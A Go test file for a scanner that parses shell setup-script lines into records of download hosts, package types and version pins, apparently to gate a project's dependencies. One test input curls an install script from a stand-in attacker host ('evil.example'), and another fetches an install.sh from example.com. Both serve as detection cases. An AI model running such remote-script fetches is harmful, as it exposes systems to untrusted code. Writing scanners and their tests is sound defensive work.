// Copyright (c) 2026, NVIDIA CORPORATION.  All rights reserved.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"strings"
	"testing"
)

func TestShellLineRecords(t *testing.T) {
	tests := []struct {
		name     string
		line     string
		wantHost string // "" = expect no record
		wantPkg  string
		wantPin  string
		wantWarn bool
	}{
		{
			name:     "go install with var",
			line:     `                    go install github.com/goreleaser/goreleaser/v2@"${GORELEASER_VERSION}"`,
			wantHost: hostGoProxy, wantPkg: PkgGoModule, wantPin: PinVar,
		},
		{
			name:     "go install latest",
			line:     `go install sigs.k8s.io/kind@latest`,
			wantHost: hostGoProxy, wantPkg: PkgGoModule, wantPin: PinLatest,
		},
		{
			name:     "pip with pinned var",
			line:     `if python3 -m pip install --user "awscli==${AWSCLI_VERSION}" 2>/dev/null; then`,
			wantHost: hostPyPI, wantPkg: PkgPyPI, wantPin: PinVar,
		},
		{
			name:     "apt install",
			line:     `                        sudo apt-get install -y python3-venv`,
			wantHost: hostApt, wantPkg: PkgApt, wantPin: PinNone,
		},
		{
			name:     "brew install",
			line:     `                brew install ko`,
			wantHost: hostHomebrew, wantPkg: PkgBrew, wantPin: PinNone,
		},
		{
			name:     "github release assignment (literal host, var version)",
			line:     `    KO_URL="https://github.com/ko-build/ko/releases/download/v${KO_VERSION}/ko.tar.gz"`,
			wantHost: "github.com", wantPkg: PkgBinaryRelease, wantPin: PinVar,
		},
		{
			name:     "grype install script pinned to main branch",
			line:     `    GRYPE_SCRIPT_URL="https://raw.githubusercontent.com/anchore/grype/main/install.sh"`,
			wantHost: "raw.githubusercontent.com", wantPkg: PkgInstallScript, wantPin: PinBranch,
		},
		{
			name:     "golangci install script pinned to version var",
			line:     `    GOLANGCI_SCRIPT_URL="https://raw.githubusercontent.com/golangci/golangci-lint/${GOLANGCI_LINT_VERSION}/install.sh"`,
			wantHost: "raw.githubusercontent.com", wantPkg: PkgInstallScript, wantPin: PinVar,
		},
		{
			name:     "log_warning advice line is NOT mined",
			line:     `                    log_warning "pip install failed; install manually: pip install awscli==${AWSCLI_VERSION}"`,
			wantHost: "",
		},
		{
			name:     "curl with trailing && echo IS still mined (F2)",
			line:     `    curl -fsSL https://example.com/get/install.sh && echo done`,
			wantHost: "example.com", wantPkg: PkgInstallScript, wantPin: PinNone,
		},
		{
			name:     "logger PREFIX then curl IS still mined (CodeRabbit)",
			line:     `    log_info "installing tool" && curl -fsSL https://evil.example/i.sh`,
			wantHost: "evil.example", wantPkg: PkgInstallScript, wantPin: PinNone,
		},
		{
			name:     "advice URL in log_info is NOT mined (go.dev false positive)",
			line:     `        log_info "Please install Go ${GO_VERSION} from https://go.dev/dl/"`,
			wantHost: "",
		},
		{
			name:     "comment line is skipped",
			line:     `# curl https://github.com/foo/bar/releases/download/v1/baz`,
			wantHost: "",
		},
		{
			name:     "curl with shell-var URL yields a warning, no record",
			line:     `    curl -fsSL "$KO_URL" | tar -xzC "$KO_TMP"`,
			wantHost: "", wantWarn: true,
		},
		{
			name:     "go install with trailing && echo IS still mined (F2)",
			line:     `go install github.com/x/y@v1.2.3 && echo installed`,
			wantHost: hostGoProxy, wantPkg: PkgGoModule, wantPin: PinTag,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			recs, warns := shellLineRecords("tools/setup-tools", tt.line)
			if tt.wantHost == "" {
				if len(recs) != 0 {
					t.Fatalf("expected no records, got %+v", recs)
				}
				if tt.wantWarn && len(warns) == 0 {
					t.Errorf("expected a warning, got none")
				}
				if !tt.wantWarn && len(warns) != 0 {
					t.Errorf("expected no warning, got %v", warns)
				}
				return
			}
			if len(recs) == 0 {
				t.Fatalf("expected a record for host %q, got none", tt.wantHost)
			}
			got := recs[0]
			if got.Host != tt.wantHost {
				t.Errorf("host = %q, want %q", got.Host, tt.wantHost)
			}
			if got.PackageType != tt.wantPkg {
				t.Errorf("packageType = %q, want %q", got.PackageType, tt.wantPkg)
			}
			if got.PinType != tt.wantPin {
				t.Errorf("pinType = %q, want %q", got.PinType, tt.wantPin)
			}
		})
	}
}

// TestGoInstallEmitsProxyAndChecksum verifies a `go install` line records both
// the module proxy and the checksum db (both are gated hosts), and that a bare
// `$VAR` version is classified as a var pin, not a tag.
func TestGoInstallEmitsProxyAndChecksum(t *testing.T) {
	recs, _ := shellLineRecords("tools/setup-tools", `go install example.com/x/y@$TOOL_VERSION`)
	hosts := map[string]string{} // host -> pinType
	for _, r := range recs {
		hosts[r.Host] = r.PinType
	}
	if _, ok := hosts[hostGoProxy]; !ok {
		t.Errorf("missing %s record", hostGoProxy)
	}
	if _, ok := hosts[hostGoSum]; !ok {
		t.Errorf("missing %s record (checksum db is a gated host)", hostGoSum)
	}
	if hosts[hostGoProxy] != PinVar {
		t.Errorf("bare $VAR version = %q, want var pin", hosts[hostGoProxy])
	}
}

// TestScanShellDataOversizedLine ensures a scanner failure (an oversized line
// past the 1 MiB token limit) surfaces as a sourceError — it must not let the
// gate pass with silently-dropped records.
func TestScanShellDataOversizedLine(t *testing.T) {
	data := []byte(strings.Repeat("x", 1024*1024+1) + "\ncurl https://example.invalid/tool\n")
	_, _, srcErrs := scanShellData("tools/setup-tools", data)
	if len(srcErrs) == 0 {
		t.Errorf("oversized line must produce a sourceError, not a silent drop")
	}
}

// TestShellMultiPackage covers the multi-package install case (F3): every
// package on the line becomes its own record.
func TestShellMultiPackage(t *testing.T) {
	recs, _ := shellLineRecords("tools/setup-tools", `sudo apt-get install -y curl git jq`)
	var pkgs []string
	for _, r := range recs {
		if r.PackageType == PkgApt {
			pkgs = append(pkgs, r.Detail)
		}
	}
	if len(pkgs) != 3 {
		t.Fatalf("apt multi-package: got %v, want [curl git jq]", pkgs)
	}
}
